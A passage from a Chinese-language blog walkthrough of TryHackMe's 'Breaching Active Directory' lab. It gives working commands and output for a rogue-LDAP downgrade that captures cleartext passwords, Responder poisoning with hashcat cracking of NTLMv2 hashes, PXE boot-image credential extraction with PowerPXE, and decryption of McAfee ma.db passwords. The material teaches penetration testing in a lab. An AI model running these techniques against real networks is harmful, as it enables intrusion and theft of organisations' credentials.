<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         #olcSaslSecProps.ldif</span><br><span class="line">dn: cn=config</span><br><span class="line">replace: olcSaslSecProps</span><br><span class="line">olcSaslSecProps: noanonymous,minssf=0,passcred</span><br></pre></td></tr></tbody></table></figure>

<p>该文件具有以下属性：</p>
<ul>
<li><strong>olcSaslSecProps:</strong> 指定 SASL 安全属性</li>
<li><strong>noanonymous:</strong> 禁用支持匿名登录的机制</li>
<li><strong>minssf:</strong> 指定可接受的最小安全强度，0 表示无保护。</li>
</ul>
<p>现在我们可以使用 ldif 文件来修补我们的 LDAP 服务器，方法如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif &amp;&amp; sudo service slapd restart</span><br></pre></td></tr></tbody></table></figure>

<p>我们可以使用以下命令验证我们的恶意 LDAP 服务器的配置是否已应用（<strong>注意</strong>：如果您使用 Kali，您可能不会收到任何输出，但配置应该已生效，您可以继续执行后续步骤 ）：</p>
<p> LDAP 搜索以验证支持的身份验证机制</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         [thm@thm]$ ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms</span><br><span class="line">dn:</span><br><span class="line">supportedSASLMechanisms: PLAIN</span><br><span class="line">supportedSASLMechanisms: LOGIN</span><br></pre></td></tr></tbody></table></figure>

<p>捕获 LDAP 凭证</p>
<p>我们的恶意 LDAP 服务器现已配置完毕。 当我们单击 <a target="_blank" rel="noopener" href="http://printer.za.tryhackme.com/settings.aspx">http://printer.za.tryhackme.com/settings.aspx</a> 上的“测试设置”时，身份验证将以明文形式进行。 如果您正确配置了恶意 LDAP 服务器并且它正在降级通信，您将收到以下错误：“此专有名称包含无效语法”。 如果收到此错误，您可以使用以下命令使用 tcpdump 来捕获凭据：</p>
<p>​          TCPDump      </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         [thm@thm]$ sudo tcpdump -SX -i breachad tcp port 389</span><br><span class="line">tcpdump: verbose output suppressed, use -v[v]... for full protocol decode</span><br><span class="line">listening on eth1, link-type EN10MB (Ethernet), snapshot length 262144 bytes</span><br><span class="line">10:41:52.979933 IP 10.10.10.201.49834 &gt; 10.10.10.57.ldap: Flags [P.], seq 4245946075:4245946151, ack 1113052386, win 8212, length 76</span><br><span class="line">	0x0000:  4500 0074 b08c 4000 8006 20e2 0a0a 0ac9  E..t..@.........</span><br><span class="line">	0x0010:  0a0a 0a39 c2aa 0185 fd13 fedb 4257 d4e2  ...9........BW..</span><br><span class="line">	0x0020:  5018 2014 1382 0000 3084 0000 0046 0201  P.......0....F..</span><br><span class="line">	0x0030:  0263 8400 0000 3d04 000a 0100 0a01 0002  .c....=.........</span><br><span class="line">	0x0040:  0100 0201 7801 0100 870b 6f62 6a65 6374  ....x.....object</span><br><span class="line">	0x0050:  636c 6173 7330 8400 0000 1904 1773 7570  class0.......sup</span><br><span class="line">	0x0060:  706f 7274 6564 5341 534c 4d65 6368 616e  portedSASLMechan</span><br><span class="line">	0x0070:  6973 6d73                                isms</span><br><span class="line">10:41:52.979938 IP 10.10.10.57.ldap &gt; 10.10.10.201.49834: Flags [.], ack 4245946151, win 502, length 0</span><br><span class="line">	0x0000:  4500 0028 247d 4000 4006 ed3d 0a0a 0a39  E..($}@.@..=...9</span><br><span class="line">	0x0010:  0a0a 0ac9 0185 c2aa 4257 d4e2 fd13 ff27  ........BW.....'</span><br><span class="line">	0x0020:  5010 01f6 2930 0000                      P...)0..</span><br><span class="line">10:41:52.980162 IP 10.10.10.57.ldap &gt; 10.10.10.201.49834: Flags [P.], seq 1113052386:1113052440, ack 4245946151, win 502, length 54</span><br><span class="line">	0x0000:  4500 005e 247e 4000 4006 ed06 0a0a 0a39  E..^$~@.@......9</span><br><span class="line">	0x0010:  0a0a 0ac9 0185 c2aa 4257 d4e2 fd13 ff27  ........BW.....'</span><br><span class="line">	0x0020:  5018 01f6 2966 0000 3034 0201 0264 2f04  P...)f..04...d/.</span><br><span class="line">	0x0030:  0030 2b30 2904 1773 7570 706f 7274 6564  .0+0)..supported</span><br><span class="line">	0x0040:  5341 534c 4d65 6368 616e 6973 6d73 310e  SASLMechanisms1.</span><br><span class="line">	0x0050:  0405 504c 4149 4e04 054c 4f47 494e       ..PLAIN..LOGIN</span><br><span class="line">[....]</span><br><span class="line">10:41:52.987145 IP 10.10.10.201.49835 &gt; 10.10.10.57.ldap: Flags [.], ack 3088612909, win 8212, length 0</span><br><span class="line">	0x0000:  4500 0028 b092 4000 8006 2128 0a0a 0ac9  E..(..@...!(....</span><br><span class="line">	0x0010:  0a0a 0a39 c2ab 0185 8b05 d64a b818 7e2d  ...9.......J..~-</span><br><span class="line">	0x0020:  5010 2014 0ae4 0000 0000 0000 0000       P.............</span><br><span class="line">10:41:52.989165 IP 10.10.10.201.49835 &gt; 10.10.10.57.ldap: Flags [P.], seq 2332415562:2332415627, ack 3088612909, win 8212, length 65</span><br><span class="line">	0x0000:  4500 0069 b093 4000 8006 20e6 0a0a 0ac9  E..i..@.........</span><br><span class="line">	0x0010:  0a0a 0a39 c2ab 0185 8b05 d64a b818 7e2d  ...9.......J..~-</span><br><span class="line">	0x0020:  5018 2014 3afe 0000 3084 0000 003b 0201  P...:...0....;..</span><br><span class="line">	0x0030:  0560 8400 0000 3202 0102 0418 7a61 2e74  .`....2.....za.t</span><br><span class="line">	0x0040:  7279 6861 636b 6d65 2e63 6f6d 5c73 7663  ryhackme.com\svc</span><br><span class="line">	0x0050:  4c44 4150 8013 7472 7968 6163 6b6d 656c  LDAP..password11</span><br></pre></td></tr></tbody></table></figure>

<p>另请注意，“password11”是一个示例。 您的服务密码将会不同。 在 TCPdump 返回数据之前，您可能需要按几次“测试设置”按钮，因为我们是通过 VPN 连接执行攻击。</p>
<p>现在我们有了另一组有效的 AD 凭据！ 通过使用 LDAP 回传攻击并降级支持的身份验证机制，我们可以拦截明文形式的凭据。</p>
<h1 id="Authentication-Relays"><a href="#Authentication-Relays" class="headerlink" title="Authentication Relays"></a>Authentication Relays</h1><p>继续讨论可以从我们的恶意设备发起的攻击，我们现在将研究针对更广泛的网络身份验证协议的攻击。 在Windows网络中，有大量的服务相互通信，允许用户利用网络提供的服务。</p>
<p>这些服务必须使用内置的身份验证方法来验证传入连接的身份。 在任务 2 中，我们探索了 Web 应用程序上使用的 NTLM 身份验证。 在此任务中，我们将更深入地了解从网络角度来看此身份验证的情况。 但是，对于此任务，我们将重点关注 SMB 使用的 NetNTLM 身份验证。</p>
<p>服务器消息块</p>
<p>服务器消息块 (SMB) 协议允许客户端（如工作站）与服务器（如文件共享）进行通信。 在使用 Microsoft AD 的网络中，SMB 负责管理从网络间文件共享到远程管理的所有事务。 即使当您尝试打印文档时计算机收到的“缺纸”警报也是 SMB 协议的作用。</p>
<p>然而，早期版本的 SMB 协议的安全性被认为是不够的。 发现了多个漏洞和漏洞，可用于恢复凭据，甚至在设备上执行代码。 尽管其中一些漏洞在协议的新版本中得到了解决，但组织通常不会强制使用更新的版本，因为遗留系统不支持它们。 我们将研究使用 SMB 进行 NetNTLM 身份验证的两种不同漏洞：</p>
<ul>
<li>由于NTLM Challenges可以被拦截，我们可以使用离线破解技术来恢复与NTLM Challenge相关的密码。 然而，这种破解过程比直接破解 NTLM 哈希要慢得多。</li>
<li>我们可以使用我们的流氓设备发起中间人攻击，在客户端和服务器之间中继 SMB 身份验证，这将为我们提供主动的经过身份验证的会话以及对目标服务器的访问。</li>
</ul>
<p>LLMNR、NBT-NS 和 WPAD</p>
<p>在此任务中，我们将稍微了解一下使用 SMB 期间发生的身份验证。 我们将使用 Responder 尝试拦截 NetNTLM 挑战来破解它。 网络上通常有很多这样的挑战。 一些安全解决方案甚至扫描整个 IP 范围以从主机恢复信息。 有时，由于 DNS 记录过时，这些身份验证挑战最终可能会攻击您的恶意设备而不是目标主机。</p>
<p>Responder 允许我们通过在 NetNTLM 身份验证期间毒害响应来执行中间人攻击，欺骗客户端与您而不是他们想要连接的实际服务器进行对话。 在真实 LAN 上，Responder 将尝试毒害检测到的任何链路本地多播名称解析 (LLMNR)、NetBIOS 名称服务 (NBT-NS) 和 Web 代理自动发现 (WPAD) 请求。 在大型 Windows 网络上，这些协议允许主机为同一本地网络上的所有主机执行自己的本地 DNS 解析。 主机可以首先尝试通过发送 LLMNR 请求并查看是否有主机响应来确定它们正在查找的主机是否位于同一本地网络上，而不是使 DNS 服务器等网络资源负担过重。 NBT-NS 是 LLMNR 的先驱协议，发出 WPAD 请求是为了尝试为未来的 HTTP(s) 连接找到代理。</p>
<p>由于这些协议依赖于在本地网络上广播的请求，因此我们的恶意设备也会收到这些请求。 通常，这些请求会被简单地丢弃，因为它们不是针对我们的主机的。 然而，响应者将主动侦听请求并发送有毒响应，告诉请求主机我们的 IP 与请求的主机名相关联。 通过毒害这些请求，Responder 尝试强制客户端连接到我们的 AttackBox。 在同一行中，它开始托管多个服务器，例如 SMB、HTTP、SQL 等，以捕获这些请求并强制进行身份验证。</p>
<p>拦截 NetNTLM 挑战</p>
<p>需要注意的一件事是，Responder 实质上试图通过毒害连接来赢得竞争条件，以确保您拦截连接。 这意味着响应程序通常仅限于本地网络上的中毒身份验证质询。 由于我们通过 VPN 连接到网络，因此我们只能破坏该 VPN 网络上发生的身份验证质询。 为此，我们模拟了一个可能中毒的身份验证请求，每 30 分钟运行一次。 这意味着您可能需要等待一段时间才能拦截 NetNTLM 质询和响应。</p>
<p>尽管 Responder 在从连接到组织 LAN 的恶意设备执行时能够拦截和毒害更多身份验证请求，但了解这种行为可能具有破坏性至关重要，因此检测到。 通过中毒身份验证请求，正常的网络身份验证尝试将失败，这意味着用户和服务将无法连接到他们想要连接的主机和共享。 在安全评估中使用 Responder 时请记住这一点。</p>
<p>Responder 已安装在 AttackBox 上。 但是，如果您不使用 AttackBox，则可以从此存储库下载并安装它：<a target="_blank" rel="noopener" href="https://github.com/lgandx/Responder%E3%80%82">https://github.com/lgandx/Responder。</a> 我们将设置 Responder 在连接到 VPN 的接口上运行：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo responder -I breachad</span><br></pre></td></tr></tbody></table></figure>

<p>如果您使用 AttackBox，则并非所有响应程序服务都能够启动，因为其他服务已在使用这些端口。 但是，这不会影响此任务。 Responder 现在将侦听任何传入的 LLMNR、NBT-NS 或 WPAD 请求。我们会让 Responder 在真实 LAN 上运行一段时间。 然而，在我们的例子中，我们必须通过让其中一台服务器尝试对 VPN 上的计算机进行身份验证来模拟这种中毒。 让 Responder 运行一段时间（平均 10 分钟，呼吸一下新鲜空气！），您应该会收到一个 SMBv2 连接，Responder 可以使用该连接来吸引和提取 NTLMv2-SSP 响应。 它看起来像这样：</p>
<p>​          NTLM Password Spraying Attack      </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         [+] Listening for events...</span><br><span class="line">[SMBv2] NTLMv2-SSP Client   : &lt;Client IP&gt;</span><br><span class="line">[SMBv2] NTLMv2-SSP Username : ZA\&lt;Service Account Username&gt;</span><br><span class="line">[SMBv2] NTLMv2-SSP Hash     : &lt;Service Account Username&gt;::ZA:&lt;NTLMv2-SSP Hash&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>如果我们使用恶意设备，我们可能会运行 Responder 相当长的时间，捕获多个响应。 一旦我们有了几个，我们就可以开始对响应执行一些离线破解，以期恢复它们关联的 NTLM 密码。 如果账户配置了弱密码，我们就有很大的机会成功破解它们。 将 NTLMv2-SSP 哈希复制到文本文件。 然后，我们将使用可下载文件中提供的密码列表来执行此任务，并使用 Hashcat 尝试使用以下命令破解哈希：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">hashcat -m 5600 &lt;hash file&gt; &lt;password file&gt;   --force</span><br></pre></td></tr></tbody></table></figure>

<p>密码文件已在 AttackBox 上的 <code>/root/Rooms/BreachingAD/task5/</code> 目录中或作为可下载的任务文件提供。 我们使用 hashtype 5600，它与 hashcat 的 NTLMv2-SSP 相对应。 如果您使用自己的机器，则必须先安装<a target="_blank" rel="noopener" href="https://hashcat.net/hashcat/">Hashcat</a>。</p>
<p>我们可以破解的任何哈希现在都将为我们提供用于违规的 AD 凭据！</p>
<p>传递挑战</p>
<p>然而，在某些情况下，我们可以更进一步，尝试传递挑战，而不是直接捕获挑战。 如果事先不了解帐户，则执行此操作会有点困难，因为此攻击取决于关联帐户的权限。 我们需要做一些对我们有利的事情：</p>
<ul>
<li>SMB 签名应禁用或启用但不强制执行。 当我们执行中继时，我们会对请求进行微小的更改以将其传递。 如果启用了 SMB 签名，我们将无法伪造消息签名，这意味着服务器会拒绝它。</li>
<li>关联帐户需要服务器上的相关权限才能访问所请求的资源。 理想情况下，我们希望中继具有服务器管理权限的帐户的质询和响应，因为这将使我们能够在主机上立足。</li>
<li>由于我们在技术上还没有 AD 立足点，因此需要对哪些帐户对哪些主机拥有权限进行一些猜测。 如果我们已经违反了 AD，我们可以先执行一些初始枚举，这通常是这种情况。</li>
</ul>
<p>这就是盲接通常不流行的原因。 理想情况下，您首先使用另一种方法破坏 AD，然后执行枚举以确定与您所破坏的帐户关联的权限。 从这里，您通常可以执行横向移动以跨域进行权限升级。 不过，从根本上了解一下中继攻击的工作原理还是很好的，如下图所示：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6baba3537d36d0fa78c6f61cf1386f6f.png" alt="img"></p>
<h1 id="Microsoft-Deployment-Toolkit"><a href="#Microsoft-Deployment-Toolkit" class="headerlink" title="Microsoft Deployment Toolkit"></a>Microsoft Deployment Toolkit</h1><p>大型组织需要工具来部署和管理资产的基础设施。 在大型组织中，您无法让 IT 人员使用 DVD 甚至 USB 闪存驱动器在每台计算机上安装软件。 幸运的是，微软已经提供了管理资产所需的工具。 然而，我们也可以利用这些工具中的错误配置来破坏 AD。</p>
<p>MDT 和 SCCM</p>
<p>Microsoft 部署工具包 (MDT) 是一项 Microsoft 服务，可帮助自动部署 Microsoft 操作系统 (OS)。 大型组织使用 MDT 等服务来帮助更有效地在其资产中部署新映像，因为可以在中央位置维护和更新基础映像。</p>
<p>通常，MDT 与 Microsoft 的系统中心配置管理器 (SCCM) 集成，后者管理所有 Microsoft 应用程序、服务和操作系统的所有更新。 MDT 用于新部署。 从本质上讲，它允许 IT 团队预配置和管理启动映像。 因此，如果他们需要配置一台新机器，只需插入网线，一切都会自动发生。 他们可以对启动映像进行各种更改，例如已经安装 Office365 等默认软件和组织选择的防病毒软件。 它还可以确保在安装第一次运行时更新新版本。</p>
<p>SCCM 几乎可以被视为 MDT 的扩展和老大哥。 软件安装后会发生什么？ 嗯，SCCM 进行这种类型的补丁管理。 它允许 IT 团队查看整个地产中安装的所有软件的可用更新。 团队还可以在沙箱环境中测试这些补丁，以确保它们稳定，然后再将它们集中部署到所有加入域的计算机。 它使 IT 团队的工作变得更加轻松。</p>
<p>然而，任何提供基础设施集中管理的东西（例如 MDT 和 SCCM）也可能成为攻击者的目标，试图接管该资产中的大部分关键功能。 尽管可以通过多种方式配置 MDT，但对于此任务，我们将专门关注称为预启动执行环境 (PXE) 启动的配置。</p>
<p>PXE启动</p>
<p>大型组织使用 PXE 引导来允许连接到网络的新设备直接通过网络连接加载和安装操作系统。 MDT 可用于创建、管理和托管 PXE 启动映像。 PXE 启动通常与 DHCP 集成，这意味着如果 DHCP 分配 IP 租约，则允许主机请求 PXE 启动映像并启动网络操作系统安装过程。 通信流程如下图所示:</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/8117a18103e98ee2ccda91fc87c63606.png" alt="img"></p>
<p>执行该过程后，客户端将使用 TFTP 连接下载 PXE 启动映像。 我们可以将 PXE 启动映像用于两个不同的目的：</p>
<ul>
<li>注入权限升级向量（例如本地管理员帐户），以便在 PXE 启动完成后获得对操作系统的管理访问权限。</li>
<li>执行密码抓取攻击以恢复安装期间使用的 AD 凭据。</li>
</ul>
<p>在本任务中，我们将重点关注后者。 我们将尝试在安装过程中恢复与 MDT 服务关联的部署服务帐户，以应对此密码抓取攻击。 此外，还可以检索用于无人值守安装应用程序和服务的其他 AD 帐户。</p>
<p>PXE 启动映像检索</p>
<p>由于 DHCP 有点挑剔，我们将绕过此攻击的初始步骤。 我们将跳过尝试从 DHCP 请求 IP 和 PXE 启动预配置详细信息的部分。 我们将手动执行该过程中此步骤的其余攻击。</p>
<p>您通过 DHCP 收到的有关 PXE 启动预配置的第一条信息是 MDT 服务器的 IP。 在我们的例子中，您可以从 TryHackMe 网络图中恢复该信息。</p>
<p>您收到的第二条信息是 BCD 文件的名称。 这些文件存储与不同类型的体系结构的 PXE 引导相关的信息。 要检索此信息，您需要连接到此网站：<a target="_blank" rel="noopener" href="http://pxeboot.za.tryhackme.com./">http://pxeboot.za.tryhackme.com。</a> 它将列出各种 BCD 文件：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/63264e3ddce1a8b438a7c8b6d527688c.png" alt="img"></p>
<p>通常，您将使用 TFTP 请求每个 BCD 文件并枚举所有文件的配置。 不过，由于时间关系，我们将重点关注 <strong>x64</strong> 架构的 BCD 文件。 复制并存储该文件的全名。 在本练习的其余部分中，我们将使用此名称占位符“x64{7B…B3}.bcd”，因为 MDT 每天都会重新生成文件及其名称。 每次看到此占位符时，请记住将其替换为您的特定 BCD 文件名。 <strong>另请注意，如果网络刚刚启动，这些文件名只会在网络处于活动状态 10 分钟后更新。</strong></p>
<p>现在从 DHCP 恢复了初始信息（眨眼），我们可以枚举并检索 PXE 启动映像。 在接下来的几个步骤中，我们将使用 THMJMP1 上的 SSH 连接，因此请使用以下命令对此 SSH 会话进行身份验证：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ssh thm@THMJMP1.za.tryhackme.com</span><br></pre></td></tr></tbody></table></figure>

<p>以及“Password1@”的密码。</p>
<p>为了确保网络的所有用户都可以使用 SSH，首先使用您的用户名创建一个文件夹，并将 powerpxe 存储库复制到此文件夹中：</p>
<p> SSH 命令提示符</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         C:\Users\THM&gt;cd Documents</span><br><span class="line">C:\Users\THM\Documents&gt; mkdir &lt;username&gt;</span><br><span class="line">C:\Users\THM\Documents&gt; copy C:\powerpxe &lt;username&gt;\</span><br><span class="line">C:\Users\THM\Documents\&gt; cd &lt;username&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>我们需要执行的第一步是使用 TFTP 并下载 BCD 文件来读取 MDT 服务器的配置。 TFTP 比 FTP 有点棘手，因为我们无法列出文件。 相反，我们发送文件请求，服务器将通过 UDP 连接回我们以传输文件。 因此，我们在指定文件和文件路径时需要准确。 BCD 文件始终位于 MDT 服务器上的 /Tmp/ 目录中。 我们可以在 SSH 会话中使用以下命令启动 TFTP 传输：</p>
<p>​          SSH Command Prompt      </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         C:\Users\THM\Documents\Am0&gt; tftp -i &lt;THMMDT IP&gt; GET "\Tmp\x64{39...28}.bcd" conf.bcd</span><br><span class="line">Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s</span><br></pre></td></tr></tbody></table></figure>

<p>您必须使用“nslookup thmmdt.za.tryhackme.com”查找 THMMDT IP。 现在恢复了 BCD 文件，我们将使用 <a target="_blank" rel="noopener" href="https://github.com/wavestone-cdt/powerpxe">powerpxe</a> 来读取其内容。 Powerpxe 是一个 PowerShell 脚本，可自动执行此类攻击，但通常会产生不同的结果，因此最好执行手动方法。 我们将使用 powerpxe 的 Get-WimFile 函数从 BCD 文件中恢复 PXE 启动映像的位置：</p>
<p>​          SSH Command Prompt      </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         C:\Users\THM\Documents\Am0&gt; powershell -executionpolicy bypass</span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.   </span><br><span class="line"></span><br><span class="line">PS C:\Users\THM\Documents\am0&gt; Import-Module .\PowerPXE.ps1</span><br><span class="line">PS C:\Users\THM\Documents\am0&gt; $BCDFile = "conf.bcd"</span><br><span class="line">PS C:\Users\THM\Documents\am0&gt; Get-WimFile -bcdFile $BCDFile</span><br><span class="line">&gt;&gt; Parse the BCD file: conf.bcd</span><br><span class="line">&gt;&gt;&gt;&gt; Identify wim file : &lt;PXE Boot Image Location&gt;</span><br><span class="line">&lt;PXE Boot Image Location&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>WIM 文件是 Windows 映像格式 (WIM) 的可启动映像。 现在我们已经知道了 PXE 启动映像的位置，我们可以再次使用 TFTP 下载该映像：</p>
<p>​          SSH Command Prompt      </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         PS C:\Users\THM\Documents\am0&gt; tftp -i &lt;THMMDT IP&gt; GET "&lt;PXE Boot Image Location&gt;" pxeboot.wim</span><br><span class="line">Transfer successful: 341899611 bytes in 218 second(s), 1568346 bytes/s</span><br></pre></td></tr></tbody></table></figure>

<p>由于您正在下载完全可启动且已配置的 Windows 映像，因此此下载将需要一段时间。 也许在等待的时候伸伸腿，喝杯水。</p>
<p>从 PXE 启动映像恢复凭据</p>
<p>现在我们已经恢复了 PXE 启动映像，我们可以窃取存储的凭据。 应该指出的是，我们可以发起各种攻击。 我们可以注入本地管理员用户，因此一旦映像启动，我们就拥有管理员访问权限，我们可以安装映像以拥有加入域的计算机。 如果您有兴趣了解有关这些攻击的更多信息，可以阅读这篇<a target="_blank" rel="noopener" href="https://www.riskinsight-wavestone.com/en/2020/01/take-over-windows-workstations-pxe-laps/">文章</a> 。 本次练习将重点关注尝试窃取凭据的简单攻击。</p>
<p>我们将再次使用 powerpxe 来恢复凭据，但您也可以通过提取映像并查找 bootstrap.ini 文件（通常存储这些类型的凭据）来手动执行此步骤。 要使用 powerpxe 从引导文件恢复凭据，请运行以下命令：</p>
<p>​          SSH Command Prompt      </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         PS C:\Users\THM\Documents\am0&gt; Get-FindCredentials -WimFile pxeboot.wim</span><br><span class="line">&gt;&gt; Open pxeboot.wim</span><br><span class="line">&gt;&gt;&gt;&gt; Finding Bootstrap.ini</span><br><span class="line">&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; DeployRoot = \\THMMDT\MTDBuildLab$</span><br><span class="line">&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserID = &lt;account&gt;</span><br><span class="line">&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserDomain = ZA</span><br><span class="line">&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserPassword = &lt;password&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>如您所见，powerpxe 能够恢复 AD 凭据。 我们现在有了另一组可以使用的 AD 凭据！</p>
<h1 id="Configuration-Files"><a href="#Configuration-Files" class="headerlink" title="Configuration Files"></a>Configuration Files</h1><p>我们将在此网络中探索的最后一个枚举途径是配置文件。 假设您足够幸运，造成了一次漏洞，使您能够访问组织网络上的主机。 在这种情况下，配置文件是尝试恢复 AD 凭据的绝佳探索途径。 根据被破坏的主机，各种配置文件可能具有枚举价值：</p>
<ul>
<li>Web应用程序配置文件</li>
<li>服务配置文件</li>
<li>注册表项</li>
<li>集中部署的应用程序</li>
</ul>
<p>可以使用多个枚举脚本（例如 <a target="_blank" rel="noopener" href="https://github.com/GhostPack/Seatbelt">Seatbelt</a>）来自动执行此过程。</p>
<p>配置文件凭证</p>
<p>但是，在此任务中，我们将重点关注从集中部署的应用程序恢复凭据。 通常，这些应用程序需要一种在安装和执行阶段对域进行身份验证的方法。 此类应用程序的一个示例是 McAfee Enterprise Endpoint Security，组织可以将其用作端点检测和安全响应工具。</p>
<p>McAfee 将安装期间用于连接回 Orchestrator 的凭据嵌入名为 ma.db 的文件中。 可以通过对主机的本地访问来检索和读取该数据库文件，以恢复关联的 AD 服务帐户。 在本练习中，我们将再次使用 THMJMP1 上的 SSH 访问。</p>
<p>ma.db 文件存储在固定位置：</p>
<p>​          SSH Command Prompt      </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         thm@THMJMP1 C:\Users\THM&gt;cd C:\ProgramData\McAfee\Agent\DB</span><br><span class="line">thm@THMJMP1 C:\ProgramData\McAfee\Agent\DB&gt;dir</span><br><span class="line"> Volume in drive C is Windows 10</span><br><span class="line"> Volume Serial Number is 6A0F-AA0F</span><br><span class="line"></span><br><span class="line"> Directory of C:\ProgramData\McAfee\Agent\DB      </span><br><span class="line"></span><br><span class="line">03/05/2022  10:03 AM    &lt;DIR&gt;          .</span><br><span class="line">03/05/2022  10:03 AM    &lt;DIR&gt;          ..</span><br><span class="line">03/05/2022  10:03 AM           120,832 ma.db      </span><br><span class="line">               1 File(s)        120,832 bytes     </span><br><span class="line">               2 Dir(s)  39,426,285,568 bytes free</span><br><span class="line">      </span><br></pre></td></tr></tbody></table></figure>

<p>我们可以使用 SCP 将 ma.db 复制到我们的 AttackBox：</p>
<p>​          Terminal      </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         thm@thm:~/thm# scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .</span><br><span class="line">thm@10.200.4.249's password:</span><br><span class="line">ma.db 100%  118KB 144.1KB/s   00:00</span><br><span class="line">      </span><br></pre></td></tr></tbody></table></figure>

<p>为了读取数据库文件，我们将使用一个名为 sqlitebrowser 的工具。 我们可以使用以下命令打开数据库：</p>
<p>​          Terminal      </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">thm@thm:# sqlitebrowser ma.db</span><br></pre></td></tr></tbody></table></figure>

<p>使用 sqlitebrowser，我们将选择“浏览数据”选项并关注 AGENT_REPOSITORIES 表：</p>
<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/aeda85be24462cc6a3f0c03cd899053a.png" alt="img"></p>
<p>我们对第二个条目特别感兴趣，重点是 DOMAIN、AUTH_USER 和 AUTH_PASSWD 字段条目。 记下这些条目中存储的值。 但是，AUTH_PASSWD 字段已加密。 幸运的是，McAfee 使用已知密钥加密该字段。 因此，我们将使用以下旧的 python2 脚本来解密密码。 该脚本已作为可下载的任务文件或在 AttackBox 上提供，可以在“/root/Rooms/BreachingAD/task7/”目录中找到。</p>
<p><strong>注意：我们在这里使用的工具相当旧。 它使用 Python v2 并依赖于旧的加密库。 如果您无法让脚本在您自己的虚拟机上运行，请使用 AttackBox。 但是，该应用程序最近进行了更新，以确保它也可以在 Python3 上运行，您可以在此处下载最新版本：<a target="_blank" rel="noopener" href="https://github.com/funoverip/mcafee-sitelist-pwd-decryption">https://github.com/funoverip/mcafee-sitelist-pwd-decryption</a></strong></p>
<p>您必须解压缩 mcafee-sitelist-pwd-decryption.zip 文件：</p>
<p>​          Terminal      </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">thm@thm:~/root/Rooms/BreachingAD/task7/$ unzip mcafeesitelistpwddecryption.zip   </span><br></pre></td></tr></tbody></table></figure>

<p>通过向脚本提供我们的 base64 编码和加密密码，该脚本将提供解密的密码：</p>
<p>​          Terminal      </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">         thm@thm:~/root/Rooms/BreachingAD/task7/mcafee-sitelist-pwd-decryption-master$ python2 mcafee_sitelist_pwd_decrypt.py &lt;AUTH PASSWD VALUE&gt;</span><br><span class="line">Crypted password   : &lt;AUTH PASSWD VALUE&gt;</span><br><span class="line">Decrypted password : &lt;Decrypted Pasword&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>现在，我们再次拥有了一组 AD 凭据，可用于进一步枚举！ 这只是从配置文件恢复凭据的示例之一。 如果您能够在主机上站稳脚跟，请务必遵循详细而完善的方法，以确保从主机恢复所有战利品，包括凭证和其他可以存储在配置文件中的敏感信息。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://mikannse.space">Mikannse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://mikannse.space/2024/04/12/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0BreachingActiveDirectory/">http://mikannse.space/2024/04/12/THM域学习BreachingActiveDirectory/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mikannse.space" target="_blank">MikannseのSekai</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/Domain/">Domain</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script 